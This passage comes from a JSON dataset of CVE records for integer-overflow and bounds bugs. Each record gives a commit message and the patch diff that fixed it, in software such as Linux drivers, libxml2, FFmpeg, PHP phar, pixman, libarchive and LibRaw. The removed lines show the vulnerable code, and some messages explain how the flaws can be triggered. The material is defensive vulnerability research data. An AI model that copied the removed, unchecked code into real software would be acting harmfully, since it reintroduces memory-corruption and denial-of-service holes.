243d12fdec66a4360fbb3e307a046b39b5b4ffc3\nGnuPG-bug-id: 2344\nReported-by: Pascal Cuoq\nSigned-off-by: Werner Koch <wk@gnupg.org>\n---\n src\/dn.c | 5 +----\n 1 file changed, 1 insertion(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/src\/dn.c b\/src\/dn.c\nindex d207bf0..cea18a1 100644\n--- a\/src\/dn.c\n+++ b\/src\/dn.c\n@@ -332,11 +332,8 @@ append_utf8_value (const unsigned char *value, size_t length,\n         }\n       else\n         {\n-          if (n+nmore > length)\n-            nmore = length - n; \/* Oops, encoding to short *\/\n-\n           tmp[0] = *s++; n++;\n-          for (i=1; i <= nmore; i++)\n+          for (i=1; n < length && i <= nmore; i++)\n             {\n               if ( (*s & 0xc0) != 0x80)\n                 break; \/* Invalid encoding - let the next cycle detect this. *\/\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2010-4157","CWE_ID":"189","category":"security","commit_id":"f63ae56e4e97fb12053590e41a4fa59e7daa74a4","commit_message":"From f63ae56e4e97fb12053590e41a4fa59e7daa74a4 Mon Sep 17 00:00:00 2001\nFrom: Dan Carpenter <error27@gmail.com>\nDate: Fri, 8 Oct 2010 09:03:07 +0200\nSubject: [SCSI] gdth: integer overflow in ioctl\n\ngdth_ioctl_alloc() takes the size variable as an int.\ncopy_from_user() takes the size variable as an unsigned long.\ngen.data_len and gen.sense_len are unsigned longs.\nOn x86_64 longs are 64 bit and ints are 32 bit.\n\nWe could pass in a very large number and the allocation would truncate\nthe size to 32 bits and allocate a small buffer.  Then when we do the\ncopy_from_user(), it would result in a memory corruption.\n\nCC: stable@kernel.org\nSigned-off-by: Dan Carpenter <error27@gmail.com>\nSigned-off-by: James Bottomley <James.Bottomley@suse.de>\n---\n drivers\/scsi\/gdth.c | 8 ++++++++\n 1 file changed, 8 insertions(+)\n\n","diff_code":"diff --git a\/drivers\/scsi\/gdth.c b\/drivers\/scsi\/gdth.c\nindex 5a3f93101017..841101846b88 100644\n--- a\/drivers\/scsi\/gdth.c\n+++ b\/drivers\/scsi\/gdth.c\n@@ -4177,6 +4177,14 @@ static int ioc_general(void __user *arg, char *cmnd)\n     ha = gdth_find_ha(gen.ionode);\n     if (!ha)\n         return -EFAULT;\n+\n+    if (gen.data_len > INT_MAX)\n+        return -EINVAL;\n+    if (gen.sense_len > INT_MAX)\n+        return -EINVAL;\n+    if (gen.data_len + gen.sense_len > INT_MAX)\n+        return -EINVAL;\n+\n     if (gen.data_len + gen.sense_len != 0) {\n         if (!(buf = gdth_ioctl_alloc(ha, gen.data_len + gen.sense_len,\n                                      FALSE, &paddr)))\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2011-1944","CWE_ID":"189","category":"security","commit_id":"d7958b21e7f8c447a26bb2436f08402b2c308be4","commit_message":"From d7958b21e7f8c447a26bb2436f08402b2c308be4 Mon Sep 17 00:00:00 2001\nFrom: Chris Evans <scarybeasts@gmail.com>\nDate: Wed, 23 Mar 2011 08:13:06 +0800\nSubject: [PATCH] Fix some potential problems on reallocation failures\n\nThe count was incremented before the allocation\nand not fixed in case of failure\n* xpath.c: corrects a few instances where the available count of some\n           structure is updated before we know the allocation actually\n           succeeds\n---\n xpath.c | 20 ++++++++++----------\n 1 file changed, 10 insertions(+), 10 deletions(-)\n\n","diff_code":"diff --git a\/xpath.c b\/xpath.c\nindex 8b561891..608fe00d 100644\n--- a\/xpath.c\n+++ b\/xpath.c\n@@ -3522,13 +3522,13 @@ xmlXPathNodeSetAddNs(xmlNodeSetPtr cur, xmlNodePtr node, xmlNsPtr ns) {\n     } else if (cur->nodeNr == cur->nodeMax) {\n         xmlNodePtr *temp;\n \n-        cur->nodeMax *= 2;\n-\ttemp = (xmlNodePtr *) xmlRealloc(cur->nodeTab, cur->nodeMax *\n+\ttemp = (xmlNodePtr *) xmlRealloc(cur->nodeTab, cur->nodeMax * 2 *\n \t\t\t\t      sizeof(xmlNodePtr));\n \tif (temp == NULL) {\n \t    xmlXPathErrMemory(NULL, \"growing nodeset\\n\");\n \t    return;\n \t}\n+        cur->nodeMax *= 2;\n \tcur->nodeTab = temp;\n     }\n     cur->nodeTab[cur->nodeNr++] = xmlXPathNodeSetDupNs(node, ns);\n@@ -3627,14 +3627,14 @@ xmlXPathNodeSetAddUnique(xmlNodeSetPtr cur, xmlNodePtr val) {\n     } else if (cur->nodeNr == cur->nodeMax) {\n         xmlNodePtr *temp;\n \n-        cur->nodeMax *= 2;\n-\ttemp = (xmlNodePtr *) xmlRealloc(cur->nodeTab, cur->nodeMax *\n+\ttemp = (xmlNodePtr *) xmlRealloc(cur->nodeTab, cur->nodeMax * 2 *\n \t\t\t\t      sizeof(xmlNodePtr));\n \tif (temp == NULL) {\n \t    xmlXPathErrMemory(NULL, \"growing nodeset\\n\");\n \t    return;\n \t}\n \tcur->nodeTab = temp;\n+        cur->nodeMax *= 2;\n     }\n     if (val->type == XML_NAMESPACE_DECL) {\n \txmlNsPtr ns = (xmlNsPtr) val;\n@@ -3738,14 +3738,14 @@ xmlXPathNodeSetMerge(xmlNodeSetPtr val1, xmlNodeSetPtr val2) {\n \t} else if (val1->nodeNr == val1->nodeMax) {\n \t    xmlNodePtr *temp;\n \n-\t    val1->nodeMax *= 2;\n-\t    temp = (xmlNodePtr *) xmlRealloc(val1->nodeTab, val1->nodeMax *\n+\t    temp = (xmlNodePtr *) xmlRealloc(val1->nodeTab, val1->nodeMax * 2 *\n \t\t\t\t\t     sizeof(xmlNodePtr));\n \t    if (temp == NULL) {\n \t        xmlXPathErrMemory(NULL, \"merging nodeset\\n\");\n \t\treturn(NULL);\n \t    }\n \t    val1->nodeTab = temp;\n+\t    val1->nodeMax *= 2;\n \t}\n \tif (n2->type == XML_NAMESPACE_DECL) {\n \t    xmlNsPtr ns = (xmlNsPtr) n2;\n@@ -3907,14 +3907,14 @@ xmlXPathNodeSetMergeAndClear(xmlNodeSetPtr set1, xmlNodeSetPtr set2,\n \t    } else if (set1->nodeNr >= set1->nodeMax) {\n \t\txmlNodePtr *temp;\n \n-\t\tset1->nodeMax *= 2;\n \t\ttemp = (xmlNodePtr *) xmlRealloc(\n-\t\t    set1->nodeTab, set1->nodeMax * sizeof(xmlNodePtr));\n+\t\t    set1->nodeTab, set1->nodeMax * 2 * sizeof(xmlNodePtr));\n \t\tif (temp == NULL) {\n \t\t    xmlXPathErrMemory(NULL, \"merging nodeset\\n\");\n \t\t    return(NULL);\n \t\t}\n \t\tset1->nodeTab = temp;\n+\t\tset1->nodeMax *= 2;\n \t    }\n \t    if (n2->type == XML_NAMESPACE_DECL) {\n \t\txmlNsPtr ns = (xmlNsPtr) n2;\n@@ -3991,14 +3991,14 @@ xmlXPathNodeSetMergeAndClearNoDupls(xmlNodeSetPtr set1, xmlNodeSetPtr set2,\n \t    } else if (set1->nodeNr >= set1->nodeMax) {\n \t\txmlNodePtr *temp;\n \n-\t\tset1->nodeMax *= 2;\n \t\ttemp = (xmlNodePtr *) xmlRealloc(\n-\t\t    set1->nodeTab, set1->nodeMax * sizeof(xmlNodePtr));\n+\t\t    set1->nodeTab, set1->nodeMax * 2 * sizeof(xmlNodePtr));\n \t\tif (temp == NULL) {\n \t\t    xmlXPathErrMemory(NULL, \"merging nodeset\\n\");\n \t\t    return(NULL);\n \t\t}\n \t\tset1->nodeTab = temp;\n+\t\tset1->nodeMax *= 2;\n \t    }\n \t    set1->nodeTab[set1->nodeNr++] = n2;\n \t}\n-- \n2.21.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-0876","CWE_ID":"189","category":"security","commit_id":"5260edee7e5bd975837696c8c8c1a80eb2fbd7c1","commit_message":"From 5260edee7e5bd975837696c8c8c1a80eb2fbd7c1 Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Tue, 12 Feb 2013 02:03:28 +0100\nSubject: [PATCH] sanm: Use the correct height variable in the decoded_size\n checks\n\nFixes integer overflow and out of array accesses\n\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/sanm.c | 8 ++++----\n 1 file changed, 4 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/libavcodec\/sanm.c b\/libavcodec\/sanm.c\nindex 500c01f37c..caeaa366a6 100644\n--- a\/libavcodec\/sanm.c\n+++ b\/libavcodec\/sanm.c\n@@ -420,8 +420,8 @@ static int old_codec37(SANMVideoContext *ctx, int top,\n     flags        = bytestream2_get_byte(&ctx->gb);\n     bytestream2_skip(&ctx->gb, 3);\n \n-    if (decoded_size > height * stride - left - top * stride) {\n-        decoded_size = height * stride - left - top * stride;\n+    if (decoded_size > ctx->height * stride - left - top * stride) {\n+        decoded_size = ctx->height * stride - left - top * stride;\n         av_log(ctx->avctx, AV_LOG_WARNING, \"decoded size is too large\\n\");\n     }\n \n@@ -658,8 +658,8 @@ static int old_codec47(SANMVideoContext *ctx, int top,\n     decoded_size = bytestream2_get_le32(&ctx->gb);\n     bytestream2_skip(&ctx->gb, 8);\n \n-    if (decoded_size > height * stride - left - top * stride) {\n-        decoded_size = height * stride - left - top * stride;\n+    if (decoded_size > ctx->height * stride - left - top * stride) {\n+        decoded_size = ctx->height * stride - left - top * stride;\n         av_log(ctx->avctx, AV_LOG_WARNING, \"decoded size is too large\\n\");\n     }\n \n-- \n2.11.0\n\n","owner":"FFmpeg","repo":"FFmpeg","source":"cve"},{"CVE_ID":"CVE-2015-7804","CWE_ID":"189","category":"security","commit_id":"1ddf72180a52d247db88ea42a3e35f824a8fbda1","commit_message":"From 1ddf72180a52d247db88ea42a3e35f824a8fbda1 Mon Sep 17 00:00:00 2001\nFrom: Stanislav Malyshev <stas@php.net>\nDate: Mon, 28 Sep 2015 21:37:26 -0700\nSubject: [PATCH] Better fix for bug #70433\n\n---\n ext\/phar\/dirstream.c | 2 +-\n ext\/phar\/util.c      | 2 +-\n ext\/phar\/zip.c       | 4 +++-\n 3 files changed, 5 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/ext\/phar\/dirstream.c b\/ext\/phar\/dirstream.c\nindex 4728e29..75cf049 100644\n--- a\/ext\/phar\/dirstream.c\n+++ b\/ext\/phar\/dirstream.c\n@@ -207,7 +207,7 @@ static php_stream *phar_make_dirstream(char *dir, HashTable *manifest TSRMLS_DC)\n \tzend_hash_internal_pointer_reset(manifest);\n \n \twhile (FAILURE != zend_hash_has_more_elements(manifest)) {\n-\t\tif (HASH_KEY_IS_STRING != zend_hash_get_current_key_ex(manifest, &key, &keylen, &unused, 0, NULL)) {\n+\t\tif (HASH_KEY_NON_EXISTENT == zend_hash_get_current_key_ex(manifest, &key, &keylen, &unused, 0, NULL)) {\n \t\t\tbreak;\n \t\t}\n \ndiff --git a\/ext\/phar\/util.c b\/ext\/phar\/util.c\nindex e7decda..303daed 100644\n--- a\/ext\/phar\/util.c\n+++ b\/ext\/phar\/util.c\n@@ -1977,7 +1977,7 @@ void phar_add_virtual_dirs(phar_archive_data *phar, char *filename, int filename\n \n \twhile ((s = zend_memrchr(filename, '\/', filename_len))) {\n \t\tfilename_len = s - filename;\n-\t\tif (FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {\n+\t\tif (!filename_len || FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {\n \t\t\tbreak;\n \t\t}\n \t}\ndiff --git a\/ext\/phar\/zip.c b\/ext\/phar\/zip.c\nindex 142165c..e4883d3 100644\n--- a\/ext\/phar\/zip.c\n+++ b\/ext\/phar\/zip.c\n@@ -396,7 +396,9 @@ foundit:\n \n \t\tif (entry.filename[entry.filename_len - 1] == '\/') {\n \t\t\tentry.is_dir = 1;\n-\t\t\tentry.filename_len--;\n+\t\t\tif(entry.filename_len > 1) {\n+\t\t\t\tentry.filename_len--;\n+\t\t\t}\n \t\t\tentry.flags |= PHAR_ENT_PERM_DEF_DIR;\n \t\t} else {\n \t\t\tentry.is_dir = 0;\n-- \n2.1.4\n\n","owner":"php","repo":"php-src","source":"cve"},{"CVE_ID":"CVE-2013-1591","CWE_ID":"189","category":"security","commit_id":"de60e2e0e3eb6084f8f14b63f25b3cbfb012943f","commit_message":"From de60e2e0e3eb6084f8f14b63f25b3cbfb012943f Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?S=C3=B8ren=20Sandmann=20Pedersen?= <ssp@redhat.com>\nDate: Sat, 15 Sep 2012 03:13:09 -0400\nSubject: Fix for infinite-loop test\n\nThe infinite loop detected by \"affine-test 212944861\" is caused by an\noverflow in this expression:\n\n    max_x = pixman_fixed_to_int (vx + (width - 1) * unit_x) + 1;\n\nwhere (width - 1) * unit_x doesn't fit in a signed int. This causes\nmax_x to be too small so that this:\n\n    src_width = 0\n\n    while (src_width < REPEAT_NORMAL_MIN_WIDTH && src_width <= max_x)\n        src_width += src_image->bits.width;\n\nresults in src_width being 0. Later on when src_width is used for\nrepeat calculations, we get the infinite loop.\n\nBy casting unit_x to int64_t, the expression no longer overflows and\naffine-test 212944861 and infinite-loop no longer loop forever.\n---\n pixman\/pixman-inlines.h | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/pixman\/pixman-inlines.h b\/pixman\/pixman-inlines.h\nindex 5517de5..3a3c658 100644\n--- a\/pixman\/pixman-inlines.h\n+++ b\/pixman\/pixman-inlines.h\n@@ -859,7 +859,7 @@ fast_composite_scaled_bilinear ## scale_func_name (pixman_implementation_t *imp,\n     {\t\t\t\t\t\t\t\t\t\t\t\t\\\n \tvx = v.vector[0];\t\t\t\t\t\t\t\t\t\\\n \trepeat (PIXMAN_REPEAT_NORMAL, &vx, pixman_int_to_fixed(src_image->bits.width));\t\t\\\n-\tmax_x = pixman_fixed_to_int (vx + (width - 1) * unit_x) + 1;\t\t\t\t\\\n+\tmax_x = pixman_fixed_to_int (vx + (width - 1) * (int64_t)unit_x) + 1;\t\t\t\\\n \t\t\t\t\t\t\t\t\t\t\t\t\\\n \tif (src_image->bits.width < REPEAT_NORMAL_MIN_WIDTH)\t\t\t\t\t\\\n \t{\t\t\t\t\t\t\t\t\t\t\t\\\n-- \ncgit v1.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2009-1385","CWE_ID":"189","category":"security","commit_id":"ea30e11970a96cfe5e32c03a29332554573b4a10","commit_message":"From ea30e11970a96cfe5e32c03a29332554573b4a10 Mon Sep 17 00:00:00 2001\nFrom: Neil Horman <nhorman@tuxdriver.com>\nDate: Tue, 2 Jun 2009 01:29:58 -0700\nSubject: e1000: add missing length check to e1000 receive routine\n\n\tPatch to fix bad length checking in e1000.  E1000 by default does two\nthings:\n\n1) Spans rx descriptors for packets that don't fit into 1 skb on recieve\n2) Strips the crc from a frame by subtracting 4 bytes from the length prior to\ndoing an skb_put\n\nSince the e1000 driver isn't written to support receiving packets that span\nmultiple rx buffers, it checks the End of Packet bit of every frame, and\ndiscards it if its not set.  This places us in a situation where, if we have a\nspanning packet, the first part is discarded, but the second part is not (since\nit is the end of packet, and it passes the EOP bit test).  If the second part of\nthe frame is small (4 bytes or less), we subtract 4 from it to remove its crc,\nunderflow the length, and wind up in skb_over_panic, when we try to skb_put a\nhuge number of bytes into the skb.  This amounts to a remote DOS attack through\ncareful selection of frame size in relation to interface MTU.  The fix for this\nis already in the e1000e driver, as well as the e1000 sourceforge driver, but no\none ever pushed it to e1000.  This is lifted straight from e1000e, and prevents\nsmall frames from causing the underflow described above\n\nSigned-off-by: Neil Horman <nhorman@tuxdriver.com>\nTested-by: Andy Gospodarek <andy@greyhouse.net>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n drivers\/net\/e1000\/e1000_main.c | 5 +++--\n 1 file changed, 3 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/drivers\/net\/e1000\/e1000_main.c b\/drivers\/net\/e1000\/e1000_main.c\nindex b1419e21b46b..fffb006b7d95 100644\n--- a\/drivers\/net\/e1000\/e1000_main.c\n+++ b\/drivers\/net\/e1000\/e1000_main.c\n@@ -4027,8 +4027,9 @@ static bool e1000_clean_rx_irq(struct e1000_adapter *adapter,\n \t\t                 PCI_DMA_FROMDEVICE);\n \n \t\tlength = le16_to_cpu(rx_desc->length);\n-\n-\t\tif (unlikely(!(status & E1000_RXD_STAT_EOP))) {\n+\t\t\/* !EOP means multiple descriptors were used to store a single\n+\t\t * packet, also make sure the frame isn't just CRC only *\/\n+\t\tif (unlikely(!(status & E1000_RXD_STAT_EOP) || (length <= 4))) {\n \t\t\t\/* All receives must fit into a single buffer *\/\n \t\t\tE1000_DBG(\"%s: Receive packet consumed multiple\"\n \t\t\t\t  \" buffers\\n\", netdev->name);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-0211","CWE_ID":"189","category":"security","commit_id":"22531545514043e04633e1c015c7540b9de9dbe4","commit_message":"From 22531545514043e04633e1c015c7540b9de9dbe4 Mon Sep 17 00:00:00 2001\nFrom: Tim Kientzle <kientzle@acm.org>\nDate: Fri, 22 Mar 2013 23:48:41 -0700\nSubject: [PATCH] Limit write requests to at most INT_MAX. This prevents a\n certain common programming error (passing -1 to write) from leading to other\n problems deeper in the library.\n\n---\n libarchive\/archive_write.c | 5 +++++\n 1 file changed, 5 insertions(+)\n\n","diff_code":"diff --git a\/libarchive\/archive_write.c b\/libarchive\/archive_write.c\nindex eede5e057..be8562150 100644\n--- a\/libarchive\/archive_write.c\n+++ b\/libarchive\/archive_write.c\n@@ -673,8 +673,13 @@ static ssize_t\n _archive_write_data(struct archive *_a, const void *buff, size_t s)\n {\n \tstruct archive_write *a = (struct archive_write *)_a;\n+\tconst size_t max_write = INT_MAX;\n+\n \tarchive_check_magic(&a->archive, ARCHIVE_WRITE_MAGIC,\n \t    ARCHIVE_STATE_DATA, \"archive_write_data\");\n+\t\/* In particular, this catches attempts to pass negative values. *\/\n+\tif (s > max_write)\n+\t\ts = max_write;\n \tarchive_clear_error(&a->archive);\n \treturn ((a->format_write_data)(a, buff, s));\n }\n","owner":"libarchive","repo":"libarchive","source":"cve"},{"CVE_ID":"CVE-2015-7674","CWE_ID":"189","category":"security","commit_id":"e9a5704edaa9aee9498f1fbf6e1b70fcce2e55aa","commit_message":"From e9a5704edaa9aee9498f1fbf6e1b70fcce2e55aa Mon Sep 17 00:00:00 2001\nFrom: Benjamin Otte <otte@redhat.com>\nDate: Tue, 22 Sep 2015 22:44:51 +0200\nSubject: [PATCH] pixops: Don't overflow variables when shifting them\n\nIf we shift by 16 bits we need to be sure those 16 bits actually exist.\nThey do now.\n---\n gdk-pixbuf\/pixops\/pixops.c | 10 +++++-----\n 1 file changed, 5 insertions(+), 5 deletions(-)\n\n","diff_code":"diff --git a\/gdk-pixbuf\/pixops\/pixops.c b\/gdk-pixbuf\/pixops\/pixops.c\nindex 4cdb5df54..b0abecd1b 100644\n--- a\/gdk-pixbuf\/pixops\/pixops.c\n+++ b\/gdk-pixbuf\/pixops\/pixops.c\n@@ -264,11 +264,11 @@ pixops_scale_nearest (guchar        *dest_buf,\n \t\t      double         scale_x,\n \t\t      double         scale_y)\n {\n-  int i;\n-  int x;\n-  int x_step = (1 << SCALE_SHIFT) \/ scale_x;\n-  int y_step = (1 << SCALE_SHIFT) \/ scale_y;\n-  int xmax, xstart, xstop, x_pos, y_pos;\n+  gint64 i;\n+  gint64 x;\n+  gint64 x_step = (1 << SCALE_SHIFT) \/ scale_x;\n+  gint64 y_step = (1 << SCALE_SHIFT) \/ scale_y;\n+  gint64 xmax, xstart, xstop, x_pos, y_pos;\n   const guchar *p;\n \n #define INNER_LOOP(SRC_CHANNELS,DEST_CHANNELS,ASSIGN_PIXEL)     \\\n-- \n2.21.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2007-3642","CWE_ID":"189","category":"security","commit_id":"25845b5155b55cd77e42655ec24161ba3feffa47","commit_message":"From 25845b5155b55cd77e42655ec24161ba3feffa47 Mon Sep 17 00:00:00 2001\nFrom: Jing Min Zhao <zhaojingmin@vivecode.com>\nDate: Thu, 5 Jul 2007 17:05:01 -0700\nSubject: [NETFILTER]: nf_conntrack_h323: add checking of out-of-range on\n choices' index values\n\nChoices' index values may be out of range while still encoded in the fixed\nlength bit-field. This bug may cause access to undefined types (NULL\npointers) and thus crashes (Reported by Zhongling Wen).\n\nThis patch also adds checking of decode flag when decoding SEQUENCEs.\n\nSigned-off-by: Jing Min Zhao <zhaojingmin@vivecode.com>\nSigned-off-by: Patrick McHardy <kaber@trash.net>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/netfilter\/nf_conntrack_h323_asn1.c | 4 +++-\n 1 file changed, 3 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/net\/netfilter\/nf_conntrack_h323_asn1.c b\/net\/netfilter\/nf_conntrack_h323_asn1.c\nindex f6fad713d484..6b7eaa019d4c 100644\n--- a\/net\/netfilter\/nf_conntrack_h323_asn1.c\n+++ b\/net\/netfilter\/nf_conntrack_h323_asn1.c\n@@ -518,7 +518,7 @@ int decode_seq(bitstr_t * bs, field_t * f, char *base, int level)\n \t\t\tCHECK_BOUND(bs, 2);\n \t\t\tlen = get_len(bs);\n \t\t\tCHECK_BOUND(bs, len);\n-\t\t\tif (!base) {\n+\t\t\tif (!base || !(son->attr & DECODE)) {\n \t\t\t\tPRINT(\"%*.s%s\\n\", (level + 1) * TAB_SIZE,\n \t\t\t\t      \" \", son->name);\n \t\t\t\tbs->cur += len;\n@@ -704,6 +704,8 @@ int decode_choice(bitstr_t * bs, field_t * f, char *base, int level)\n \t} else {\n \t\text = 0;\n \t\ttype = get_bits(bs, f->sz);\n+\t\tif (type >= f->lb)\n+\t\t\treturn H323_ERROR_RANGE;\n \t}\n \n \t\/* Write Type *\/\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2009-1265","CWE_ID":"189","category":"security","commit_id":"83e0bbcbe2145f160fbaa109b0439dae7f4a38a9","commit_message":"From 83e0bbcbe2145f160fbaa109b0439dae7f4a38a9 Mon Sep 17 00:00:00 2001\nFrom: Alan Cox <alan@lxorguk.ukuu.org.uk>\nDate: Fri, 27 Mar 2009 00:28:21 -0700\nSubject: af_rose\/x25: Sanity check the maximum user frame size\n\nOtherwise we can wrap the sizes and end up sending garbage.\n\nCloses #10423\n\nSigned-off-by: Alan Cox <alan@lxorguk.ukuu.org.uk>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/netrom\/af_netrom.c | 6 +++++-\n net\/rose\/af_rose.c     | 4 ++++\n net\/x25\/af_x25.c       | 6 ++++++\n 3 files changed, 15 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/net\/netrom\/af_netrom.c b\/net\/netrom\/af_netrom.c\nindex 6d9c58ec56ac..d1c16bbee932 100644\n--- a\/net\/netrom\/af_netrom.c\n+++ b\/net\/netrom\/af_netrom.c\n@@ -1086,7 +1086,11 @@ static int nr_sendmsg(struct kiocb *iocb, struct socket *sock,\n \n \tSOCK_DEBUG(sk, \"NET\/ROM: sendto: Addresses built.\\n\");\n \n-\t\/* Build a packet *\/\n+\t\/* Build a packet - the conventional user limit is 236 bytes. We can\n+\t   do ludicrously large NetROM frames but must not overflow *\/\n+\tif (len > 65536)\n+\t\treturn -EMSGSIZE;\n+\n \tSOCK_DEBUG(sk, \"NET\/ROM: sendto: building packet.\\n\");\n \tsize = len + NR_NETWORK_LEN + NR_TRANSPORT_LEN;\n \ndiff --git a\/net\/rose\/af_rose.c b\/net\/rose\/af_rose.c\nindex 650139626581..0f36e8d59b29 100644\n--- a\/net\/rose\/af_rose.c\n+++ b\/net\/rose\/af_rose.c\n@@ -1124,6 +1124,10 @@ static int rose_sendmsg(struct kiocb *iocb, struct socket *sock,\n \n \t\/* Build a packet *\/\n \tSOCK_DEBUG(sk, \"ROSE: sendto: building packet.\\n\");\n+\t\/* Sanity check the packet size *\/\n+\tif (len > 65535)\n+\t\treturn -EMSGSIZE;\n+\n \tsize = len + AX25_BPQ_HEADER_LEN + AX25_MAX_HEADER_LEN + ROSE_MIN_LEN;\n \n \tif ((skb = sock_alloc_send_skb(sk, size, msg->msg_flags & MSG_DONTWAIT, &err)) == NULL)\ndiff --git a\/net\/x25\/af_x25.c b\/net\/x25\/af_x25.c\nindex 9ca17b1ce52e..ed80af8ca5fb 100644\n--- a\/net\/x25\/af_x25.c\n+++ b\/net\/x25\/af_x25.c\n@@ -1035,6 +1035,12 @@ static int x25_sendmsg(struct kiocb *iocb, struct socket *sock,\n \t\tsx25.sx25_addr   = x25->dest_addr;\n \t}\n \n+\t\/* Sanity check the packet size *\/\n+\tif (len > 65535) {\n+\t\trc = -EMSGSIZE;\n+\t\tgoto out;\n+\t}\n+\n \tSOCK_DEBUG(sk, \"x25_sendmsg: sendto: Addresses built.\\n\");\n \n \t\/* Build a packet *\/\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2015-3885","CWE_ID":"189","category":"security","commit_id":"4606c28f494a750892c5c1ac7903e62dd1c6fdb5","commit_message":"From 4606c28f494a750892c5c1ac7903e62dd1c6fdb5 Mon Sep 17 00:00:00 2001\nFrom: Alex Tutubalin <lexa@lexa.ru>\nDate: Mon, 11 May 2015 11:52:20 +0300\nSubject: [PATCH] 0.16.1: fix for dcraw ljpeg_start() vulnerability\n\n---\n Changelog.rus             |  8 ++++++--\n Changelog.txt             |  4 ++++\n dcraw\/dcraw.c             |  3 ++-\n internal\/dcraw_common.cpp | 15 ++++++++++++++-\n internal\/dcraw_fileio.cpp |  8 ++++----\n libraw\/libraw_version.h   |  2 +-\n 6 files changed, 31 insertions(+), 9 deletions(-)\n\n","diff_code":"diff --git a\/Changelog.rus b\/Changelog.rus\nindex 4813ffe6..75be4962 100644\n--- a\/Changelog.rus\n+++ b\/Changelog.rus\n@@ -1,4 +1,8 @@\n-\ufeff2014-01-17 Alex Tutubalin <lexa@lexa.ru>\n+\ufeff2015-05-11 Alex Tutubalin <lexa@lexa.ru>\n+  * \u0418\u0441\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0430 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u0432 dcraw:ljpeg_start()\n+  * LibRaw 0.16.1\n+\n+2014-01-17 Alex Tutubalin <lexa@lexa.ru>\n   * \u041f\u043e\u0434\u0434\u0435\u0440\u0436\u043a\u0430 \u043a\u0430\u043c\u0435\u0440\n     \u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u044b: Fujifilm X-E2,XQ1\n     \u041e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u044b \u0446\u0432\u0435\u0442\u043e\u0432\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435: Nikon D4, 1 AW1\/J3; Fuji X-M2\n@@ -13,7 +17,7 @@\n   * \u0418\u0441\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u044b \u043e\u0448\u0438\u0431\u043a\u0438 \u043a\u043e\u043c\u043f\u0438\u043b\u044f\u0446\u0438\u0438 \u043f\u0440\u0438 \u0441\u0431\u043e\u0440\u043a\u0435 VS2012 \u0441 \u0432\u043a\u043b\u044e\u0447\u0435\u043d\u043d\u044b\u043c\n     OpenMP\n   * \u0418\u0441\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0430 \u043e\u043f\u0435\u0447\u0430\u0442\u043a\u0430, \u043d\u0435 \u0434\u0430\u0432\u0430\u0432\u0448\u0430\u044f \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c Demosaic Pack GPL2\n-  * LibRaw 0.16.0-Beta1\n+  * LibRaw 0.16.0\n \n 2013-11-12 Alex Tutubalin <lexa@lexa.ru>\n   * \u041f\u043e\u0434\u0434\u0435\u0440\u0436\u043a\u0430 \u043d\u043e\u0432\u044b\u0445 \u043a\u0430\u043c\u0435\u0440\ndiff --git a\/Changelog.txt b\/Changelog.txt\nindex 9e675fda..546e532e 100644\n--- a\/Changelog.txt\n+++ b\/Changelog.txt\n@@ -1,3 +1,7 @@\n+2015-05-11 Alex Tutubalin <lexa@lexa.ru>\n+  * Fix for dcraw ljpeg_start() vulnerability\n+  * LibRaw 0.16.1-Release\n+\n 2014-01-17 Alex Tutubalin <lexa@lexa.ru>\n   * Camera support:\n      Added: Fujifilm XE2, XQ1\ndiff --git a\/dcraw\/dcraw.c b\/dcraw\/dcraw.c\nindex 8ea5cd72..938cab6a 100644\n--- a\/dcraw\/dcraw.c\n+++ b\/dcraw\/dcraw.c\n@@ -841,7 +841,8 @@ struct jhead {\n \n int CLASS ljpeg_start (struct jhead *jh, int info_only)\n {\n-  int c, tag, len;\n+  int c, tag;\n+  ushort len;\n   uchar data[0x10000];\n   const uchar *dp;\n \ndiff --git a\/internal\/dcraw_common.cpp b\/internal\/dcraw_common.cpp\nindex 2dcb886f..3a3c6824 100644\n--- a\/internal\/dcraw_common.cpp\n+++ b\/internal\/dcraw_common.cpp\n@@ -21,6 +21,7 @@ it under the terms of the one of three licenses as you choose:\n    for more information\n *\/\n \n+#line 261 \"dcraw\/dcraw.c\"\n #include <math.h>\n #define CLASS LibRaw::\n #include \"libraw\/libraw_types.h\"\n@@ -29,6 +30,7 @@ it under the terms of the one of three licenses as you choose:\n #include 